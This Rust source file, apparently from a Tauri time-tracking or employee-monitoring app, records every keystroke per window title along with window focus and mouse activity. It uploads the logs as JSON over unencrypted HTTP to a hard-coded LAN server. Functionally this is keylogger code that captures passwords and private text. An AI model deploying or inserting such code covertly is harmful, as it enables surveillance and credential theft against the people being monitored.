// src/activity_service.rs

use chrono::{Datelike, Utc};
use serde::{Deserialize, Serialize};
use std::{
    collections::HashMap,
    fs,
    io::{Read, Write},
    path::PathBuf,
    sync::{Arc, Mutex},
    thread,
    time::Duration,
};
use tauri::AppHandle;
use tauri::Manager;
use rdev::{listen, EventType, Key};
use active_win_pos_rs::get_active_window;
use uuid::Uuid;
// NEW: Import reqwest for making API calls
use reqwest::blocking::Client;
use super::MainAppState;

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ActivityType {
    KeyboardInput,
    MouseClick,
    MouseScroll,
    WindowFocus,
    BrowserActivity,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ActivityMeta {
    pub timestamp: String,
    pub activity_type: ActivityType,
    pub details: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub window_title: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub app_name: Option<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct LogData {
    pub activities: Vec<ActivityMeta>,
}

#[derive(Clone)]
pub struct ActivityLoggerState {
    pub is_activity_logging_running: Arc<Mutex<bool>>,
    pub meta_lock: Arc<Mutex<()>>,
    pub keystroke_buffer: Arc<Mutex<HashMap<String, String>>>,
    pub mouse_click_count: Arc<Mutex<u32>>,
    pub mouse_scroll_count: Arc<Mutex<u32>>,
}

// MODIFIED: This function now points to the "pending" directory.
/// Returns the base directory for pending activity logs.
fn get_pending_dir(app: &AppHandle) -> PathBuf {
    app.path()
        .app_data_dir()
        .unwrap()
        .join("activity_logs_pending")
}


// NEW: Function to get today's specific pending folder (e.g., .../pending/2025-11-07)
fn get_today_pending_folder(base_dir: &PathBuf) -> PathBuf {
    let now = Utc::now();
    base_dir.join(format!("{:04}-{:02}-{:02}", now.year(), now.month(), now.day()))
}

// NEW: Handles the API upload logic for a single file.
/// Tries to upload a single activity log file to the server.
fn try_upload_activity_file(client: &Client, filepath: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    // IMPORTANT: Replace this URL with your actual API endpoint for activity logs.
    let url = "http://192.168.1.26:3000/api/v1/upload"; 
    let filename = filepath.file_name().and_then(|n| n.to_str()).unwrap_or("unknown.json");

    let file_data = fs::read(filepath)?;
    let form = reqwest::blocking::multipart::Form::new().part(
        "file",
        reqwest::blocking::multipart::Part::bytes(file_data)
            .file_name(filename.to_string())
            .mime_str("application/json")?,
    );

    let response = client.post(url).multipart(form).timeout(Duration::from_secs(15)).send()?;
    
    if response.status().is_success() {
        println!("[API SUCCESS] Uploaded activity log: {}", filename);
        Ok(())
    } else {
        Err(format!("API Error for {}: {} - {}", filename, response.status(), response.text().unwrap_or_default()).into())
    }
}

// NEW: Logic to save activities to a file, then immediately try to upload it.
/// Saves activities to a file and then attempts to upload it, deleting on success.
fn save_and_try_upload(
    client: &Client,
    pending_dir: &PathBuf,
    activities: Vec<ActivityMeta>,
    meta_lock: &Arc<Mutex<()>>,
) -> Result<(), Box<dyn std::error::Error>> {
    let _guard = meta_lock.lock().unwrap();

    let today_dir = get_today_pending_folder(pending_dir);
    fs::create_dir_all(&today_dir)?;

    let timestamp = Utc::now().format("%Y-%m-%d_%H%M%S_%3f").to_string();
    let unique_id = Uuid::new_v4();
    let filename = format!("activity_{}_{}.json", timestamp, unique_id);
    let filepath = today_dir.join(&filename);

    let log_data = LogData { activities };
    let json = serde_json::to_vec_pretty(&log_data)?;
    
    let mut f = fs::File::create(&filepath)?;
    f.write_all(&json)?;
    f.sync_all()?;
    println!("[SAVE] Saved pending activity log: {}", filepath.display());
    
    // Drop the file lock before making the network request
    drop(_guard);

    match try_upload_activity_file(client, &filepath) {
        Ok(_) => {
            if let Err(e) = fs::remove_file(&filepath) {
                eprintln!("[DELETE FAILED] Could not delete successfully uploaded log {}: {}", filepath.display(), e);
            } else {
                println!("[DELETE SUCCESS] Deleted uploaded log: {}", filename);
            }
        }
        Err(e) => {
            println!("[UPLOAD FAILED] Kept log on disk: {} - {}", filename, e);
        }
    }

    Ok(())
}

// NEW: The retry logic, adapted from the screenshot service.
/// Scans the pending directory and tries to re-upload any found log files.
pub fn retry_all_pending_activities(client: &Client, base_dir: &PathBuf) {
    println!("\n[RETRY] ===== ACTIVITY RETRY CYCLE STARTED =====");
    let date_dirs = match fs::read_dir(base_dir) {
        Ok(dirs) => dirs,
        Err(_) => { /* Folder might not exist yet, which is fine */ return; }
    };

    for date_dir_entry in date_dirs.flatten() {
        let dir_path = date_dir_entry.path();
        if !dir_path.is_dir() { continue; }

        let files = match fs::read_dir(&dir_path) {
            Ok(f) => f,
            Err(_) => continue,
        };

        for file_entry in files.flatten() {
            let file_path = file_entry.path();
            if file_path.extension().and_then(|s| s.to_str()) != Some("json") { continue; }

            match try_upload_activity_file(client, &file_path) {
                Ok(_) => {
                    if let Err(e) = fs::remove_file(&file_path) {
                        eprintln!("[RETRY DELETE FAILED] Could not delete {}: {}", file_path.display(), e);
                    } else {
                        println!("[RETRY DELETE SUCCESS] Deleted: {}", file_path.display());
                    }
                }
                Err(e) => {
                    eprintln!("[RETRY UPLOAD FAILED] for {}: {}", file_path.display(), e);
                }
            }
        }
    }
    println!("[RETRY] ===== ACTIVITY RETRY CYCLE ENDED =====\n");
}


/// Keyboard and mouse monitoring thread (No changes needed)
fn run_input_monitor(state: ActivityLoggerState) {
    // ... This function remains exactly the same ...
    let is_running = state.is_activity_logging_running.clone();
    let keystroke_buffer = state.keystroke_buffer.clone();
    let mouse_click_count = state.mouse_click_count.clone();
    let mouse_scroll_count = state.mouse_scroll_count.clone();

    if let Err(error) = listen(move |event| {
        if !*is_running.lock().unwrap() {
            return;
        }
        
        match event.event_type {
            EventType::KeyPress(key) => {
                if let Ok(active_window) = get_active_window() {
                    let mut buffer = keystroke_buffer.lock().unwrap();
                    let entry = buffer.entry(active_window.title).or_insert_with(String::new);

                    match key {
                        Key::Return | Key::KpReturn => *entry += "\n",
                        Key::Space => *entry += " ",
                        Key::Tab => *entry += "\t",
                        Key::Backspace => { entry.pop(); }
                        _ => {
                            if let Some(name) = event.name {
                                 *entry += &name;
                            }
                        }
                    }
                }
            },
            EventType::ButtonPress(_button) => {
                let mut count = mouse_click_count.lock().unwrap();
                *count += 1;
            },
            EventType::Wheel { delta_x: _, delta_y } => {
                if delta_y != 0 {
                    let mut count = mouse_scroll_count.lock().unwrap();
                    *count += 1;
                }
            },
            _ => {}
        }
    }) {
        eprintln!("[ERROR] Input monitor failed: {:?}", error);
    }
}


/// Main monitoring thread for window focus, browser activity, and periodic logging.
fn run_main_monitor(app: AppHandle, state: ActivityLoggerState) {
    let client = Client::new();
    let pending_dir = get_pending_dir(&app);
    let lock = state.meta_lock.clone();
    let is_running = state.is_activity_logging_running.clone();
    let keystroke_buffer = state.keystroke_buffer.clone();
    let mouse_click_count = state.mouse_click_count.clone();
    let mouse_scroll_count = state.mouse_scroll_count.clone();

    let mut last_window_title = String::new();

    println!("Starting main monitor...");
    loop {
        if !*is_running.lock().unwrap() {
            println!("Stopping main monitor thread.");
            break;
        }
        
        // MODIFIED: Interval changed to 30 seconds
        thread::sleep(Duration::from_secs(30));

        let mut activities_to_log: Vec<ActivityMeta> = Vec::new();
        let current_timestamp = Utc::now().to_rfc3339();

        if let Ok(active_window) = get_active_window() {
            if active_window.title != last_window_title && !active_window.title.is_empty() {
                let app_name = active_window.app_name.to_lowercase();
                
                let activity_type = if ["chrome", "firefox", "edge", "safari", "brave", "msedge"].iter().any(|&name| app_name.contains(name)) {
                     ActivityType::BrowserActivity
                } else {
                    ActivityType::WindowFocus
                };

                activities_to_log.push(ActivityMeta {
                    timestamp: current_timestamp.clone(),
                    activity_type,
                    details: format!("Focus on: '{}'", active_window.title),
                    window_title: Some(active_window.title.clone()),
                    app_name: Some(active_window.app_name),
                });
                last_window_title = active_window.title.clone();
            }
        }
        
        // Log keyboard input
        let mut buffer = keystroke_buffer.lock().unwrap();
        if !buffer.is_empty() {
            for (window_title, text) in buffer.iter() {
                if !text.is_empty() {
                    activities_to_log.push(ActivityMeta {
                        timestamp: current_timestamp.clone(),
                        activity_type: ActivityType::KeyboardInput,
                        details: text.clone(),
                        window_title: Some(window_title.clone()),
                        app_name: None, 
                    });
                }
            }
            buffer.clear();
        }
        
        // Log mouse clicks
        let mut clicks = mouse_click_count.lock().unwrap();
        if *clicks > 0 {
            activities_to_log.push(ActivityMeta {
                timestamp: current_timestamp.clone(),
                activity_type: ActivityType::MouseClick,
                details: format!("{} mouse clicks", *clicks),
                window_title: None,
                app_name: None,
            });
            *clicks = 0;
        }

        // Log mouse scrolls
        let mut scrolls = mouse_scroll_count.lock().unwrap();
        if *scrolls > 0 {
            activities_to_log.push(ActivityMeta {
                timestamp: current_timestamp.clone(),
                activity_type: ActivityType::MouseScroll,
                details: format!("{} scroll events", *scrolls),
                window_title: None,
                app_name: None,
            });
            *scrolls = 0;
        }

        // MODIFIED: Use the new save-and-upload logic
        if !activities_to_log.is_empty() {
            if let Err(e) = save_and_try_upload(&client, &pending_dir, activities_to_log, &lock) {
                eprintln!("[ERROR] CRITICAL: Failed to save or upload activity log: {}", e);
            }
        }
    }
}


// MODIFIED: The start command now launches the retry thread as well.
#[tauri::command]
pub fn start_activity_logging_service(app: AppHandle, state: tauri::State<'_, MainAppState>) {
    let activity_state = state.activity_logger_state.clone();
    let is_running = activity_state.is_activity_logging_running.clone();

    {
        let mut running_flag = is_running.lock().unwrap();
        if *running_flag {
            println!("⚠️ Activity logging service already running.");
            return;
        }
        *running_flag = true;
    }

    println!("Starting activity logging service...");
    
    // 1. Start the Input Monitor Thread (Keyboard/Mouse)
    let input_state = activity_state.clone();
    thread::spawn(move || run_input_monitor(input_state));
    
    // 2. Start the Main Monitor Thread (Collects & Tries Initial Upload)
    let main_monitor_app = app.clone();
    let main_monitor_state = activity_state.clone();
    thread::spawn(move || run_main_monitor(main_monitor_app, main_monitor_state));

    // 3. NEW: Start the Retry Thread (Runs every 5 minutes)
    let retry_app = app.clone();
    let retry_is_running = is_running.clone();
    thread::spawn(move || {
        let client = Client::new();
        let pending_dir = get_pending_dir(&retry_app);
        
        loop {
            if !*retry_is_running.lock().unwrap() {
                println!("🛑 Stopping activity retry thread.");
                break;
            }
            
            // Wait for 5 minutes before the next retry cycle.
            // We sleep at the start to not retry immediately on startup.
            thread::sleep(Duration::from_secs(300));
            retry_all_pending_activities(&client, &pending_dir);
        }
    });

    println!("Activity logging services started successfully.");
}

#[tauri::command]
pub fn stop_activity_logging_service(state: tauri::State<'_, MainAppState>) {
    let mut is_running = state.activity_logger_state.is_activity_logging_running.lock().unwrap();
    *is_running = false;
    println!("🛑 Activity logging service manually stopped. It may take a moment for threads to terminate.");
}